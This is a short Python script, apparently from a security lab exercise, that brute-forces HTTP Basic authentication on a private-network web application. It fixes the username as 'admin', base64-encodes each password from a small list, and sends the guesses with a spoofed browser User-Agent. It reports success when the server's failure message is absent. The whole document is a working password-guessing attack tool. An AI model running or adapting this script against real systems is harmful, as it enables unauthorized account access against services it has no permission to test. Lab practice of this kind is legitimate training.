import base64
import requests
'''
program for brute forcing the password on an httpauth web application
'''

'''
	This function returns the user and password encoded in base64
	The input into the base64 encode call is 'admin:password'
	The return byte string will be similar to: 'Basic YWRtaW46dGVzdA=='
'''
def get_b64_auth(passwd):
	return b'Basic ' + base64.b64encode(b'admin:'+passwd)

def main():

	url=r'http://192.168.1.161/security/3/httpauth/' # the user name for login is already known as admin
	#proxies={'http': 'localhost:8080'} # proxy for debugging
	headers={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Authorization': 'tmp'}
	
		
	passes=['test','1','2222','abc','bbb','1234']
	eachpass=[get_b64_auth(bytes(i,'latin-1')) for i in passes]
	d=dict(zip(passes,eachpass))

	sesh=requests.session()	

	for k,v in d.items():
		headers['Authorization'] = v
		#resp=sesh.get(url,proxies=proxies,headers=headers) #proxy for debugging
		resp=sesh.get(url,headers=headers)
		'''
			No idea what a valid login reponse will look like.
			The partial string being tested was extracted from an invalid
			login.
		'''
		if b'This server could not verify' not in resp.content: # print response if valid login
			print(resp.content)
			print('Password is: {}'.format(k)) # print password after login password found

if __name__=='__main__':
	main()
	